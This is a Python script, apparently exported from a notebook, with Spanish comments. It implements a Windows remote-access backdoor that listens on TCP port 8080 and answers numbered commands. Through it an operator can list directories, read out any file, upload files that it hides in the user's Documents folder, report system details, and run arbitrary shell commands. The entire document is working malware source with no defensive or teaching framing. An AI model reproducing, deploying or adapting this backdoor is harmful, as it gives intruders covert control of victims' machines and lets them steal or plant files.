#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import socket as soc
import sys,win32api,win32con,os
import platform as plt
import threading  as th
import  subprocess as  sub


def recepcion_comand(cliente):
    ack='ACK'
    cliente.send(ack.encode())
    while True:
        comando=''
        comando=cliente.recv(1024)
        if comando.decode()== '1':
                try:
                    # Enviar directorio actual
                    directorio_actual=os.getcwd()
                    cliente.send(str(directorio_actual).encode())
                except:
                    valor='Error en el comando_1'
                    cliente.send(valor.encode())
                
        elif comando.decode()=='2':
                try:
                    # Enviar lista de directorios
                    directorios_sys='C:/'
                    lista_directorios=str(os.listdir(directorios_sys))
                    cliente.send(lista_directorios.encode())
                except:
                    valor='Error en el comando_2'
                    cliente.send(valor.encode())
                
        elif comando.decode()=='3':
                # Obtener datos de directorio
                cliente.send(b'OK')
                comando=cliente.recv(1024)
                try:
                    listado_archivos=[]
                    direccion=comando.decode()
                    for dispath,dirname,filesname in os.walk(direccion):
                          for  name in filesname:
                              ruta=os.path.join(dispath,name)
                              listado_archivos.append(ruta)
                    cliente.send(str(listado_archivos).encode())
                                 
                except:
                    valor='Error en el comando_3'
                    cliente.send(valor.encode())
                
        elif comando.decode()=='4':
                cliente.close()
                break
        
        elif comando.decode()=='5':
                cliente.send(str(plt.uname()).encode())
            
        elif comando.decode()=='6':
                cliente.send(b'OK')
                comando=cliente.recv(1024)
                direccion=comando.decode()
                with  open(direccion,'rb') as  fname:
                    cliente.sendfile(fname)
                    try:
                        cliente.close()
                    except OSError:
                        pass
                    fname.close()
                
        elif comando.decode()=='7':
                cliente.send(b'OK')
                comando=cliente.recv(1024)
                nombre=comando.decode()
                ruta='C:/Users/'+os.getlogin()+'/Documents/'+nombre
                with open(ruta,'wb') as fname:
                   comando=cliente.recv(10240)
                   while  comando:
                       fname.write(comando)
                       comando=cliente.recv(10240)
                   fname.close()
                   win32api.SetFileAttributes(ruta,win32con.FILE_ATTRIBUTE_HIDDEN)
                    
          
            
        elif comando.decode()=='8':
               cliente.send(b'OK')
               comando=cliente.recv(1024)
               cmd=sub.Popen(comando.decode().split(),stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
               salida=cmd.stdout.read()+cmd.stderr.read()
               cliente.send(salida.encode())
            
    return 0

def Main():
    ip=soc.gethostbyname(soc.gethostname())
    puerto=8080
    
    global verdadero
    verdadero=True
    global server
    global cliente
    try:
        server=soc.socket(soc.AF_INET,soc.SOCK_STREAM) 
        server.setsockopt(soc.SOL_SOCKET,soc.SO_REUSEADDR,1)
        server.bind((ip,puerto))
        server.listen(5)
    except :
      sys.exit()
    while verdadero:
        cliente,(client_ip,cliente_puerto)=server.accept()
        capt=th.Thread(target=recepcion_comand,args=(cliente,))
        capt.start()

if __name__=='__main__':
    Main()
#%%





